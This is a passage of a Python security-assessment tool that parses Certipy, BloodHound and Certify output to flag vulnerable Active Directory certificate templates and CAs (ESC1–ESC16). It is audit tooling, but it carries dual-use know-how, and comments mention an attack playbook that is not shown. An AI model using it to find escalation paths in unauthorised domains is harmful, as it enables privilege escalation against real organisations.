#!/usr/bin/env python3
"""
ACE Analyzer v4.2 - AD CS Certificate Template Security Assessment Tool
Detects: ESC1-ESC16 (where data allows)
Supports:
- Raw ACE JSON arrays
- BloodHound JSON format (from ADExplorerSnapshot.py)
- NDJSON format (from ADExplorerSnapshot.py Objects mode)
- Certipy JSON format (certipy find -json, v4.x and v5.x)
- Certify / Certify 2.0 plaintext format (GhostPack)
"""

import json
import sys
import argparse
import re
from pathlib import Path
from datetime import datetime

# ANSI Color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

    @staticmethod
    def strip_colors(text):
        """Remove ANSI color codes from text"""
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        return ansi_escape.sub('', text)

# Well-known SID suffixes (RIDs)
WELL_KNOWN_RIDS = {
    "498": "Enterprise Read-only Domain Controllers",
    "500": "Administrator",
    "501": "Guest",
    "502": "KRBTGT",
    "512": "Domain Admins",
    "513": "Domain Users",
    "514": "Domain Guests",
    "515": "Domain Computers",
    "516": "Domain Controllers",
    "517": "Cert Publishers",
    "518": "Schema Admins",
    "519": "Enterprise Admins",
    "520": "Group Policy Creator Owners",
    "521": "Read-only Domain Controllers",
    "522": "Cloneable Domain Controllers",
    "525": "Protected Users",
    "526": "Key Admins",
    "527": "Enterprise Key Admins",
    "553": "RAS and IAS Servers",
}

# Universal well-known SIDs
UNIVERSAL_SIDS = {
    "S-1-1-0": "Everyone",
    "S-1-5-7": "Anonymous",
    "S-1-5-11": "Authenticated Users",
    "S-1-5-18": "Local System",
    "S-1-5-19": "Local Service",
    "S-1-5-20": "Network Service",
}

# Rights explanation
RIGHTS_EXPLANATION = {
    "Owner": "Full control over the object (owns it)",
    "GenericAll": "Full control over the object",
    "GenericWrite": "Write all attributes of the object",
    "WriteProperty": "Can modify properties of the template",
    "ExtendedRight": "Can perform extended operations",
    "WriteDacl": "Can modify permissions (DACL)",
    "WriteOwner": "Can change the owner",
    "Enroll": "Can request certificates from this template",
    "AutoEnroll": "Can automatically request certificates",
    "AllExtendedRights": "Can perform all extended operations (includes Enroll, certificate requests)",
    "ManageCertificates": "Can manage issued certificates",
    "ManageCA": "Can manage the Certificate Authority",
    "None": "No specific rights (placeholder)",
}

# Extended Key Usage OIDs
EKU_OIDS = {
    "1.3.6.1.5.5.7.3.2": "Client Authentication",
    "1.3.6.1.5.5.7.3.1": "Server Authentication",
    "1.3.6.1.4.1.311.20.2.1": "Certificate Request Agent",
    "2.5.29.37.0": "Any Purpose",
    "1.3.6.1.4.1.311.20.2.2": "Smart Card Logon",
    "1.3.6.1.5.5.7.3.3": "Code Signing",
    "1.3.6.1.5.5.7.3.4": "Email Protection",
    "1.3.6.1.5.5.7.3.8": "Timestamp Signing",
    "1.3.6.1.4.1.311.10.3.4": "Encrypting File System",
    "1.3.6.1.4.1.311.10.3.11": "Key Recovery",
    "1.3.6.1.4.1.311.21.19": "Directory Service Email Replication",
    "1.3.6.1.4.1.311.21.5": "CA Encryption Certificate",
    "1.3.6.1.5.5.7.3.9": "OCSP Signing",
    "1.3.6.1.4.1.311.10.3.1": "Microsoft Trust List Signing",
    "1.3.6.1.4.1.311.10.3.10": "Qualified Subordination",
}

# Certipy CA Access Right codes -> right names
CERTIPY_CA_RIGHT_MAP = {
    "1": "ManageCA",
    "2": "ManageCertificates",
    "4": "Audit",
    "8": "Read",
    "256": "Read",
    "512": "Enroll",
    "131168": "Enroll",
    "268435456": "GenericAll",
    "983551": "GenericAll",
    "manageca": "ManageCA",
    "managecertificates": "ManageCertificates",
    "enroll": "Enroll",
    "genericall": "GenericAll",
    "read": "Read",
    "audit": "Audit",
    "fullcontrol": "GenericAll",
}

LOW_PRIV_INDICATORS = [
    # English (Active Directory canonical names)
    "Everyone", "Authenticated Users", "Domain Users",
    "Domain Guests", "Domain Computers",
    # German (Windows de-DE locale) - common in DACH environments
    "Domänen-Benutzer",           # Domain Users
    "Domänencomputer",             # Domain Computers
    "Domänen-Gäste",               # Domain Guests
    "Authentifizierte Benutzer",   # Authenticated Users
    "Jeder",                       # Everyone
]

# Prefix written into PrincipalSID when Certify's [+] User Enrollable / ACL
# annotations confirm a principal is low-privileged. This is locale-independent:
# Certify already resolved it, so we trust the annotation regardless of language.
CERTIFY_LOW_PRIV_PREFIX = "__certify_lowpriv__"


def parse_sid(sid_string):
    """Parse a SID and return domain SID, RID, and domain prefix"""
    domain_prefix = None
    if "-S-1-" in sid_string:
        parts = sid_string.split("-S-1-", 1)
        domain_prefix = parts[0] if parts[0] else None
        sid_string = "S-1-" + parts[1]

    match = re.match(r'(S-1-5-21-\d+-\d+-\d+)-(\d+)$', sid_string)
    if match:
        return match.group(1), match.group(2), domain_prefix

    if sid_string in UNIVERSAL_SIDS:
        return None, None, domain_prefix

    return None, None, domain_prefix


def get_friendly_name(sid_string, domain_sid_base=None):
    """Convert SID or principal name to friendly name"""
    # Handle Certify low-priv markers: __certify_lowpriv__DOMAIN\Name
    if sid_string.startswith(CERTIFY_LOW_PRIV_PREFIX):
        rest = sid_string[len(CERTIFY_LOW_PRIV_PREFIX):]
        name = rest.split("\\", 1)[1] if "\\" in rest else rest
        return f"[Certify-confirmed] {name}"

    # Handle non-SID names (Certipy format uses DOMAIN\Name strings)
    if not sid_string.startswith("S-") and "-S-1-" not in sid_string:
        # Strip domain prefix for matching (CONTOSO.LOCAL\Domain Users -> Domain Users)
        if "\\" in sid_string:
            return sid_string.split("\\", 1)[1]
        return sid_string

    clean_sid = sid_string
    domain_prefix = None

    if "-S-1-" in sid_string:
        parts = sid_string.split("-S-1-", 1)
        domain_prefix = parts[0]
        clean_sid = "S-1-" + parts[1]

    if clean_sid in UNIVERSAL_SIDS:
        name = UNIVERSAL_SIDS[clean_sid]
        if domain_prefix:
            return f"{name} ({domain_prefix})"
        return name

    domain_sid, rid, prefix = parse_sid(sid_string)

    if domain_sid and rid:
        if rid in WELL_KNOWN_RIDS:
            name = WELL_KNOWN_RIDS[rid]
            if prefix:
                return f"{name} ({prefix})"
            return name
        else:
            if prefix:
                return f"User/Group (RID: {rid}) ({prefix})"
            return f"User/Group (RID: {rid})"

    return sid_string


def get_eku_name(oid):
    """Get friendly name for EKU OID"""
    return EKU_OIDS.get(oid, oid)


def is_low_priv_principal(friendly_name):
    """Check if a principal name matches known low-privilege indicators.

    Returns True for:
    - Well-known low-priv groups (English and German locale names)
    - Principals confirmed as low-priv by Certify's [+] User Enrollable / ACL annotations
    """
    if friendly_name.startswith("[Certify-confirmed]"):
        return True
    return any(indicator in friendly_name for indicator in LOW_PRIV_INDICATORS)


def _clean_principal_name(name):
    """Strip the [Certify-confirmed] marker from a friendly principal name."""
    return name.removeprefix("[Certify-confirmed] ").strip()


def _dedup_principal_names(names):
    """Deduplicate a list of friendly principal names.

    Collapses '[Certify-confirmed] X' and 'X' into a single 'X' entry.
    Preserves order of first occurrence of each unique base name.
    """
    seen = set()
    result = []
    for n in names:
        key = _clean_principal_name(n)
        if key not in seen:
            seen.add(key)
            result.append(key)
    return result


def _dedup_dict_principals(items):
    """Deduplicate a list of ESC4-style principal dicts by base name.

    Merges rights and enrollment status from duplicates.
    """
    merged = {}
    for item in items:
        key = _clean_principal_name(item['name'])
        if key not in merged:
            merged[key] = dict(item)
            merged[key]['name'] = key
        else:
            existing = merged[key]
            existing['rights'] = list(set(existing['rights'] + item['rights']))
            existing['can_enroll'] = existing['can_enroll'] or item['can_enroll']
            existing['is_definitive'] = (
                existing.get('is_definitive', False) or item.get('is_definitive', False)
            )
    return list(merged.values())


# ---------------------------------------------------------------------------
# Data extraction helpers
# ---------------------------------------------------------------------------

def extract_templates_from_bloodhound(data):
    """Extract certificate templates and CAs from BloodHound JSON format"""
    templates = []
    cas = []

    if isinstance(data, dict):
        data = [data]

    for item in data:
        if not isinstance(item, dict):
            continue

        if 'data' in item:
            meta_type = item.get('meta', {}).get('type', '').lower()

            for entry in item.get('data', []):
                props = entry.get('Properties', {}) or entry.get('properties', {})
                aces = entry.get('Aces', []) or entry.get('aces', [])

                obj_type = str(props.get('type', '')).lower()

                if 'certificate template' in obj_type or meta_type == 'certtemplates':
                    templates.append({
                        'name': props.get('name', 'Unknown'),
                        'objectid': props.get('objectid', ''),
                        'aces': aces,
                        'properties': props,
                    })
                elif ('enrollment service' in obj_type or
                      'certificate authority' in obj_type or
                      meta_type == 'cas'):
                    cas.append({
                        'name': props.get('name', 'Unknown'),
                        'objectid': props.get('objectid', ''),
                        'aces': aces,
                        'properties': props,
                    })

        elif 'Aces' in item or 'aces' in item:
            aces = item.get('Aces', []) or item.get('aces', [])
            props = item.get('Properties', {}) or item.get('properties', {})
            templates.append({
                'name': props.get('name', item.get('name', 'Unknown')),
                'objectid': props.get('objectid', item.get('objectid', '')),
                'aces': aces,
                'properties': props,
            })

    return templates, cas


def _certipy_to_bool(val, default=False):
    """Parse Certipy field that can be bool, 'Enabled'/'Disabled', int, or None."""
    if val is None:
        return default
    if isinstance(val, bool):
        return val
    if isinstance(val, int):
        return val != 0
    return str(val).strip().lower() in ('enabled', 'true', 'yes', '1')


def _certipy_flag_list_has(flags, flag_name_fragment, flag_int_value):
    """
    Check whether a Certipy flag list (string names or integers) contains a flag.
    Certipy < 5.0 uses strings like "AutoEnrollment"; >= 5.0 uses integers.
    """
    if not isinstance(flags, list):
        return False
    norm = flag_name_fragment.lower().replace('_', '').replace(' ', '')
    for f in flags:
        if isinstance(f, str) and norm in f.lower().replace('_', '').replace(' ', ''):
            return True
        if isinstance(f, int) and (f & flag_int_value):
            return True
    return False


def _certipy_web_enrollment(cadata):
    """Parse Web Enrollment which may be a dict, bool, or string in different Certipy versions."""
    raw = cadata.get('Web Enrollment')
    if raw is None:
        return False
    if isinstance(raw, dict):
        # {"HTTP": true/false, "HTTPS": true/false, "Channel Binding": true/false}
        return raw.get('HTTP', False) or raw.get('HTTPS', False)
    return _certipy_to_bool(raw)


def _certipy_nosecext_ca(cadata):
    """Check whether a CA has the SID security extension disabled (ESC16)."""
    if cadata.get('No Security Extension', False):
        return True
    disabled = cadata.get('Disabled Extensions', None)
    if disabled is None:
        return False
    items = disabled if isinstance(disabled, list) else [disabled]
    oid_fragment = '1.3.6.1.4.1.311.25.2'
    return any(oid_fragment in str(e) or 'NTDS_CA_SECURITY' in str(e) for e in items)


def extract_templates_from_certipy(data):
    """
    Extract certificate templates and CAs from Certipy JSON format.

    Handles Certipy v4.x (flags as string lists) and v5.x (flags as integer lists),
    and variations in how CA properties are encoded (bool vs string vs dict).
    """
    templates = []
    cas = []

    eku_name_to_oid = {v: k for k, v in EKU_OIDS.items()}

    def make_ace(principal_name, right_name):
        return {
            'PrincipalSID': principal_name,
            'PrincipalType': 'Unknown',
            'RightName': right_name,
            'IsInherited': False,
        }

    def _list_of_strings(val):
        """Ensure the value is a list of strings; wrap scalars."""
        if val is None:
            return []
        if isinstance(val, list):
            return [str(x) for x in val]
        return [str(val)]

    # ---- Parse certificate templates ----
    for _idx, tdata in data.get("Certificate Templates", {}).items():
        if not isinstance(tdata, dict):
            continue

        # Enrollment Flag: string list (v4) or integer list (v5)
        enrollment_flags = tdata.get('Enrollment Flag', [])
        # CT_FLAG_NO_SECURITY_EXTENSION = 0x80000 = 524288
        no_sec_from_flag = _certipy_flag_list_has(
            enrollment_flags, 'nosecurityextension', 0x80000
        )

        # Certificate Name Flag: check for ENROLLEE_SUPPLIES_SUBJECT (bit 0x1 = 1)
        cert_name_flags = tdata.get('Certificate Name Flag', [])
        ess_from_flag = _certipy_flag_list_has(
            cert_name_flags, 'enrolleesuppliessubject', 0x1
        )

        props = {
            'enabled': _certipy_to_bool(tdata.get('Enabled'), default=False),
            'clientauthentication': _certipy_to_bool(tdata.get('Client Authentication')),
            'enrolleesuppliessubject': (
                _certipy_to_bool(tdata.get('Enrollee Supplies Subject')) or ess_from_flag
            ),
            'requiresmanagerapproval': _certipy_to_bool(tdata.get('Requires Manager Approval')),
            'authorizedsignatures': int(tdata.get('Authorized Signatures Required') or 0),
            'schemaversion': int(tdata.get('Schema Version') or 2),
            'nosecurityextension': (
                _certipy_to_bool(tdata.get('No Security Extension')) or no_sec_from_flag
            ),
            'ekus': [],
            'issuancepolicies': _list_of_strings(tdata.get('Issuance Policies', [])),
            'certipy_vulns': tdata.get('[!] Vulnerabilities', {}),
        }

        if tdata.get('Any Purpose', False):
            props['ekus'] = ['2.5.29.37.0']
        else:
            for eku_raw in _list_of_strings(tdata.get('Extended Key Usage', [])):
                oid = eku_name_to_oid.get(eku_raw, eku_raw)
                props['ekus'].append(oid)

        aces = []
        perms = tdata.get('Permissions', {})
        enrollment_perms = perms.get('Enrollment Permissions', {})
        obj_ctrl = perms.get('Object Control Permissions', {})

        for name in _list_of_strings(enrollment_perms.get('Enrollment Rights', [])):
            aces.append(make_ace(name, 'Enroll'))
        for name in _list_of_strings(enrollment_perms.get('AutoEnrollment Rights', [])):
            aces.append(make_ace(name, 'AutoEnroll'))
        # "All Extended Rights" is a distinct enrollment permission key in some Certipy versions
        for name in _list_of_strings(enrollment_perms.get('All Extended Rights', [])):
            aces.append(make_ace(name, 'AllExtendedRights'))

        if 'Owner' in obj_ctrl and isinstance(obj_ctrl['Owner'], str):
            aces.append(make_ace(obj_ctrl['Owner'], 'Owner'))
        for name in _list_of_strings(obj_ctrl.get('Full Control Principals', [])):
            aces.append(make_ace(name, 'GenericAll'))
        for name in _list_of_strings(obj_ctrl.get('Write Owner Principals', [])):
            aces.append(make_ace(name, 'WriteOwner'))
        for name in _list_of_strings(obj_ctrl.get('Write Dacl Principals', [])):
            aces.append(make_ace(name, 'WriteDacl'))
        for name in _list_of_strings(obj_ctrl.get('Write Property Principals', [])):
            aces.append(make_ace(name, 'WriteProperty'))

        templates.append({
            'name': tdata.get('Template Name', 'Unknown'),
            'objectid': '',
            'aces': aces,
            'properties': props,
        })

    # ---- Parse certificate authorities ----
    for _idx, cadata in data.get("Certificate Authorities", {}).items():
        if not isinstance(cadata, dict):
            continue

        ca_props = {
            'webenrollment': _certipy_web_enrollment(cadata),
            'userspecifiessan': _certipy_to_bool(cadata.get('User Specified SAN'), default=False),
            'enforceencrypticertrequest': _certipy_to_bool(
                cadata.get('Enforce Encryption for Requests'), default=True
            ),
            'nosecurityextension': _certipy_nosecext_ca(cadata),
        }

        aces = []
        perms = cadata.get('Permissions', {})
        # Owner at CA level
        if isinstance(perms.get('Owner'), str):
            aces.append(make_ace(perms['Owner'], 'Owner'))

        access_rights = perms.get('Access Rights', {})
        if isinstance(access_rights, dict):
            for right_key, principals_list in access_rights.items():
                right_name = CERTIPY_CA_RIGHT_MAP.get(
                    str(right_key).lower(),
                    CERTIPY_CA_RIGHT_MAP.get(str(right_key), f'Right_{right_key}')
                )
                for name in (principals_list if isinstance(principals_list, list)
                             else [principals_list]):
                    if name:
                        aces.append(make_ace(str(name), right_name))

        cas.append({
            'name': cadata.get('CA Name', 'Unknown'),
            'objectid': '',
            'aces': aces,
            'properties': ca_props,
        })

    return templates, cas


def parse_certify_text(content):
    """
    Parse Certify / Certify 2.0 plaintext output into internal template/CA format.

    Handles:
    - Certify v1 (GhostPack):  ``Certify.exe find [/vulnerable]``
    - Certify 2.0 (GhostPack): ``Certify.exe enum-cas`` / ``Certify.exe enum-templates``

    Field format:  ``  Field Name   :   Value``
    Rights blocks contain multi-line principal lists with optional inline SIDs:
      ``  Enrollment Rights   :   DOMAIN\\Group   S-1-5-21-...-513``
      ``                          DOMAIN\\Other   S-1-5-11``
    Vulnerabilities appear in a ``[!] Vulnerabilities`` (v1) or ``Vulnerabilities`` (v2) section.
    """
    templates = []
    cas = []
    eku_name_to_oid = {v: k for k, v in EKU_OIDS.items()}

    def to_bool(val, default=False):
        if isinstance(val, bool):
            return val
        return str(val).strip().lower() in ('true', 'yes', 'enabled', '1')

    def safe_int(val, default=0):
        try:
            return int(str(val).strip())
        except (ValueError, TypeError):
            return default

    def extract_principal(text):
        """Return (friendly_name, sid_or_name) from a principal line."""
        text = text.strip()
        # "Name  (S-1-5-11)" parentheses format
        m = re.match(r'^(.+?)\s+\((S-1-[\d-]+)\)\s*$', text)
        if m:
            return m.group(1).strip(), m.group(2)
        # "Name    S-1-5-11" spaced format (2+ spaces before SID)
        m = re.match(r'^(.+?)\s{2,}(S-1-[\d-]+)\s*$', text)
        if m:
            return m.group(1).strip(), m.group(2)
        return text, text  # name used as pseudo-SID

    def make_ace(sid_or_name, right):
        return {
            'PrincipalSID': sid_or_name,
            'PrincipalType': 'Unknown',
            'RightName': right,
            'IsInherited': False,
        }

    # Rights section labels -> right name mapping.
    # Covers Certify v1 (CamelCase labels) and actual Certify 2.0 output
    # (spaced labels like "Write Dacl Principals").
    # [+]-prefixed keys are Certify's own low-priv annotations; principals
    # extracted from them receive the CERTIFY_LOW_PRIV_PREFIX marker so that
    # is_low_priv_principal() recognises them regardless of locale.
    RIGHTS_SECTIONS = {
        # Enrollment
        'Enrollment Rights':            'Enroll',
        'AutoEnrollment Rights':        'AutoEnroll',
        'All Extended Rights':          'AllExtendedRights',
        # CA management
        'ManageCa':                     'ManageCA',
        'ManageCertificates':           'ManageCertificates',
        # Object control — CamelCase (Certify v1 / test data)
        'WriteOwner Principals':        'WriteOwner',
        'WriteDacl Principals':         'WriteDacl',
        'WriteProperty Principals':     'WriteProperty',
        # Object control — spaced names (actual Certify 2.0 output)
        'Write Owner Principals':       'WriteOwner',
        'Write Dacl Principals':        'WriteDacl',
        'Write Property Principals':    'WriteProperty',
        # "Write Property Enroll/AutoEnroll" is a scoped write-property right
        # on the enrollment attribute only — NOT a full template write right.
        # Treat it as an enrollment right, NOT a dangerous modification right,
        # so it does not falsely trigger ESC4.
        'Write Property Enroll':        'Enroll',
        'Write Property AutoEnroll':    'AutoEnroll',
        # Generic
        'Full Control Principals':      'GenericAll',
        'Owner':                        'Owner',
        # Certify low-priv annotations ([+] prefix) — use marker
        '[+] User Enrollable Principals': 'Enroll',
        '[+] User ACL Principals':        'WriteDacl',
    }

    # Split content into blocks by "CA Name" or "Template Name" anchor lines
    block_start_re = re.compile(
        r'^[ \t]*(CA Name|Template Name)\s*:',
        re.MULTILINE | re.IGNORECASE
    )
    positions = [(m.start(), m.group(1).lower()) for m in block_start_re.finditer(content)]
    if not positions:
        return [], []
    positions.append((len(content), None))

    for i in range(len(positions) - 1):
        start_pos, block_kind = positions[i]
        end_pos = positions[i + 1][0]
        block = content[start_pos:end_pos]
        block_lines = block.splitlines()

        # ---- Extract simple field:value pairs (first occurrence wins) ----
        fields = {}
        for m in re.finditer(
            r'^[ \t]*([A-Za-z][A-Za-z0-9 \[\]!*]*?)\s*:\s*(.*?)[ \t]*$',
            block, re.MULTILINE
        ):
            key = m.group(1).strip()
            val = m.group(2).strip()
            if key not in fields:
                fields[key] = val

        # ---- Extract multi-line rights blocks ----
        aces = []
        for right_label, right_name in RIGHTS_SECTIONS.items():
            # [+] entries are Certify's confirmed-low-priv annotations; apply the
            # locale-independent marker so is_low_priv_principal() always fires.
            use_lowpriv_marker = right_label.startswith('[+]')

            header_re = re.compile(
                rf'^([ \t]*)({re.escape(right_label)})\s*:\s*(.*)',
                re.IGNORECASE
            )
            for li, line in enumerate(block_lines):
                hm = header_re.match(line)
                if not hm:
                    continue
                base_indent = len(hm.group(1))
                principals_found = []
                first_val = hm.group(3).strip()
                if first_val:
                    principals_found.append(first_val)
                # Continuation lines must be more indented and not contain a field:value pattern
                for cont in block_lines[li + 1:]:
                    cont_stripped = cont.strip()
                    if not cont_stripped:
                        continue
                    cont_indent = len(cont) - len(cont.lstrip())
                    if cont_indent <= base_indent:
                        break
                    # Stop at a new sub-section header that has its own colon
                    if re.match(r'^[A-Za-z\[\]].*:', cont_stripped):
                        break
                    principals_found.append(cont_stripped)
                for pt in principals_found:
                    name, sid = extract_principal(pt)
                    if name:
                        if use_lowpriv_marker:
                            # Certify already resolved this is a low-priv enrollable
                            # principal. Embed the marker regardless of locale.
                            aces.append(make_ace(CERTIFY_LOW_PRIV_PREFIX + sid, right_name))
                        else:
                            aces.append(make_ace(sid, right_name))
                break  # Only first match per right label

        # ---- Extract vulnerability findings ----
        vulns = {}
        vuln_m = re.search(
            r'\[?!?\]?[ \t]*Vulnerabilit(?:y|ies)\s*\n(.*?)(?=\n[ \t]*\[|[ \t]*(?:Template Name|CA Name)\s*:|$)',
            block, re.DOTALL | re.IGNORECASE
        )
        if vuln_m:
            for vm in re.finditer(
                r'(ESC\d+)\s*:\s*(.+?)(?=\n[ \t]*ESC|\n[ \t]*\[|$)',
                vuln_m.group(1), re.DOTALL
            ):
                desc = ' '.join(vm.group(2).split())
                # Strip trailing standalone numbers: Certify's template index
                # on the next line sometimes bleeds into the captured group.
                desc = re.sub(r'\s+\d+$', '', desc)
                vulns[vm.group(1)] = desc

        # ---- Build EKU list ----
        ekus = []
        if to_bool(fields.get('Any Purpose', 'False')):
            ekus = ['2.5.29.37.0']
        else:
            for part in re.split(r'[,\n]', fields.get('Extended Key Usage', '')):
                part = part.strip()
                if part:
                    ekus.append(eku_name_to_oid.get(part, part))

        # ---- Check No Security Extension ----
        no_sec_ext = to_bool(fields.get('No Security Extension', 'False'))
        ef_str = fields.get('Enrollment Flag', '')
        if 'nosecurityextension' in ef_str.lower().replace(' ', '').replace('_', ''):
            no_sec_ext = True

        # ---- Check Enrollee Supplies Subject (from Certificate Name Flag too) ----
        ess = to_bool(fields.get('Enrollee Supplies Subject', 'False'))
        cnf_str = fields.get('Certificate Name Flag', '')
        if 'enrolleesuppliessubject' in cnf_str.lower().replace(' ', '').replace('_', ''):
            ess = True

        # ---- Issuance policies ----
        policy_raw = fields.get('Certificate Issuance Policies', '') or \
                     fields.get('Issuance Policies', '')
        issuance_policies = [p.strip() for p in re.split(r'[,\n]', policy_raw) if p.strip()]

        # ---- Assemble block object ----
        if block_kind in ('ca name', 'ca'):
            web_str = fields.get('Web Enrollment', '')
            # "HTTP : Enabled" may appear; simpler check: contains http and not disabled
            web_enabled = (
                ('http' in web_str.lower() and 'disabled' not in web_str.lower()) or
                to_bool(web_str)
            )
            enc_raw = (
                fields.get('Enforce Encryption for Requests') or
                fields.get('RPC Request Encryption') or
                'True'
            )
            disabled_ext = fields.get('Disabled Extensions', '')
            esc16 = (
                '1.3.6.1.4.1.311.25.2' in disabled_ext or
                'NTDS_CA_SECURITY' in disabled_ext or
                no_sec_ext
            )
            cas.append({
                'name': fields.get('CA Name', 'Unknown'),
                'objectid': '',
                'aces': aces,
                'properties': {
                    'webenrollment': web_enabled,
                    'userspecifiessan': to_bool(fields.get('User Specified SAN', 'False')),
                    'enforceencrypticertrequest': to_bool(enc_raw, True),
                    'nosecurityextension': esc16,
                    'certipy_vulns': vulns,
                    # Store DNS Name so the attack playbook can use the CA hostname
                    'dnsname': fields.get('DNS Name', ''),
                },
            })
        else:  # template
            templates.append({
                'name': fields.get('Template Name', 'Unknown'),
                'objectid': '',
                'aces': aces,
                'properties': {
                    'enabled': to_bool(fields.get('Enabled', 'True')),
                    'clientauthentication': to_bool(fields.get('Client Authentication', 'False')),
                    'enrolleesuppliessubject': ess,
                    'requiresmanagerapproval': to_bool(
                        fields.get('Requires Manager Approval', 'False')
                    ),
                    'authorizedsignatures': safe_int(
                        fields.get('Authorized Signatures Required', 0)
                    ),
                    'schemaversion': safe_int(fields.get('Schema Version', 2), default=2),
                    'nosecurityextension': no_sec_ext,
                    'ekus': ekus,
                    'issuancepolicies': issuance_policies,
                    'certipy_vulns': vulns,
                    # Keep CA association for the attack playbook
                    'certificateauthorities': [
                        ca for ca in re.split(r'[,\n]', fields.get('Certificate Authorities', ''))
                        if ca.strip()
                    ],
                },
            })

    return templates, cas


def parse_bloodhound_ace(ace):
    """Parse a BloodHound format ACE into standard format"""
    return {
        'PrincipalSID': ace.get('PrincipalSID', ace.get('principalSID', '')),
        'PrincipalType': ace.get('PrincipalType', ace.get('principalType', 'Unknown')),
        'RightName': ace.get('RightName', ace.get('rightName', ace.get('Right', 'Unknown'))),
        'IsInherited': ace.get('IsInherited', ace.get('isInherited', False)),
    }


def load_data_from_file(filepath):
    """Load ACE data from various file formats"""
    filepath = Path(filepath)

    if not filepath.exists():
        print(f"Error: File '{filepath}' not found")
        sys.exit(1)

    try:
        with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
            first_line = f.readline().strip()
            f.seek(0)
            content = f.read()

        # ---- Certify / Certify 2.0 plaintext detection (before JSON parsing) ----
        # Certify output is plaintext with field:value lines. It can start with "[*]" markers
        # (Certify v1 prints "[*] Action: ...") or directly with indented fields.
        # We distinguish from JSON by: JSON must start with { or [{ or [" etc.
        # A bare "[*]" is NOT valid JSON.
        stripped = content.lstrip()
        looks_like_json = (
            stripped.startswith('{') or
            re.match(r'^\[[\s]*[{\["\d-]', stripped)
        )
        if not looks_like_json:
            if re.search(
                r'^[ \t]*(CA Name|Template Name)\s*:',
                content, re.MULTILINE | re.IGNORECASE
            ):
                print("[*] Detected Certify / Certify 2.0 plaintext format")
                templates, cas = parse_certify_text(content)
                if templates or cas:
                    return templates, cas, 'certify'
                print("[!] Certify text detected but no templates/CAs parsed — check file format")
                sys.exit(1)

        # ---- NDJSON: multiple JSON objects separated by newlines ----
        if first_line.startswith('{') and '\n{' in content:
            print("[*] Detected NDJSON format")
            print("[!] NDJSON parsing is not fully supported. Convert to BloodHound format:")
            print("    python3 ADExplorerSnapshot.py snapshot.dat -o out.json -m BloodHound")
            return [], [], 'ndjson'

        try:
            data = json.loads(content)
        except json.JSONDecodeError:
            match = re.search(r'\[[\s\S]*\]', content)
            if match:
                data = json.loads(match.group(0))
            else:
                raise ValueError("Could not find valid JSON in file")

        # ---- Certipy JSON: top-level "Certificate Authorities" and/or "Certificate Templates" ----
        if isinstance(data, dict) and (
            'Certificate Templates' in data or 'Certificate Authorities' in data
        ):
            print("[*] Detected Certipy JSON format")
            templates, cas = extract_templates_from_certipy(data)
            if templates or cas:
                return templates, cas, 'certipy'

        # ---- BloodHound JSON: dict with 'data' + 'meta' keys ----
        if isinstance(data, dict):
            if 'data' in data and 'meta' in data:
                print("[*] Detected BloodHound JSON format")
                templates, cas = extract_templates_from_bloodhound(data)
                if templates or cas:
                    return templates, cas, 'bloodhound'

            if 'aces' in data or 'Aces' in data or 'ACEs' in data:
                aces = data.get('aces') or data.get('Aces') or data.get('ACEs')
                return aces, [], 'raw'

            return [data], [], 'raw'

        elif isinstance(data, list):
            if data and isinstance(data[0], dict) and (
                'data' in data[0] or 'Properties' in data[0] or 'properties' in data[0]
            ):
                print("[*] Detected BloodHound JSON format")
                templates, cas = extract_templates_from_bloodhound(data)
                if templates or cas:
                    return templates, cas, 'bloodhound'

            return data, [], 'raw'

        else:
            raise ValueError("Unsupported data format")

    except Exception as e:
        print(f"Error loading file: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


# ---------------------------------------------------------------------------
# ACE analysis
# ---------------------------------------------------------------------------

def analyze_aces(aces_data):
    """Analyze ACE data and detect principals with their rights"""
    principals = {}
    domain_sid_base = None

    for ace in aces_data:
        sid = (ace.get("PrincipalSID") or ace.get("principalSID") or
               ace.get("sid") or ace.get("PrincipalID"))
        right = (ace.get("RightName") or ace.get("rightName") or
                 ace.get("right") or ace.get("Right"))
        principal_type = (ace.get("PrincipalType") or ace.get("principalType") or
                          ace.get("type") or "Unknown")

        if not sid or not right:
            continue

        if not domain_sid_base and "S-1-5-21-" in str(sid):
            match = re.match(r'(S-1-5-21-\d+-\d+-\d+)-\d+$', str(sid))
            if match:
                domain_sid_base = match.group(1)

        if right != "None":
            if sid not in principals:
                principals[sid] = {"type": principal_type, "rights": []}
            if right not in principals[sid]["rights"]:
                principals[sid]["rights"].append(right)

    return principals, domain_sid_base


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------

def print_template_header(template_info, output_buffer):
    """Print header for a certificate template"""
    template_name = template_info.get('name', 'Unknown')

    if '@' in template_name:
        name_part, domain_part = template_name.rsplit('@', 1)
    else:
        name_part = template_name
        domain_part = template_info.get('properties', {}).get('domain', 'UNKNOWN')
        if domain_part and domain_part != 'UNKNOWN':
            template_name = f"{name_part}@{domain_part}"

    output_buffer.append("=" * 70)
    output_buffer.append(f"Certificate Template: {template_name}")
    output_buffer.append("=" * 70)

    if 'objectid' in template_info and template_info['objectid']:
        output_buffer.append(f"Object ID: {template_info['objectid']}")
    if 'dn' in template_info:
        output_buffer.append(f"Distinguished Name: {template_info['dn']}")

    props = template_info.get('properties', {})
    if props:
        output_buffer.append("")
        output_buffer.append("Template Configuration:")
        output_buffer.append("=" * 70)

        if 'enabled' in props:
            if props['enabled']:
                output_buffer.append(f"  Status: {Colors.GREEN}ENABLED{Colors.RESET}")
            else:
                output_buffer.append(f"  Status: {Colors.RED}DISABLED{Colors.RESET}")

        if 'schemaversion' in props:
            sv = props['schemaversion']
            if sv == 1:
                output_buffer.append(
                    f"{Colors.YELLOW}  Schema Version: {sv} [V1 - potential ESC15]{Colors.RESET}"
                )
            else:
                output_buffer.append(f"  Schema Version: {sv}")

        if 'requiresmanagerapproval' in props:
            output_buffer.append(f"  Requires Manager Approval: {props['requiresmanagerapproval']}")

        if 'enrolleesuppliessubject' in props:
            enabled = props['enrolleesuppliessubject']
            if enabled:
                output_buffer.append(
                    f"{Colors.YELLOW}  Enrollee Supplies Subject: {enabled} [DANGEROUS]{Colors.RESET}"
                )
            else:
                output_buffer.append(f"  Enrollee Supplies Subject: {enabled}")

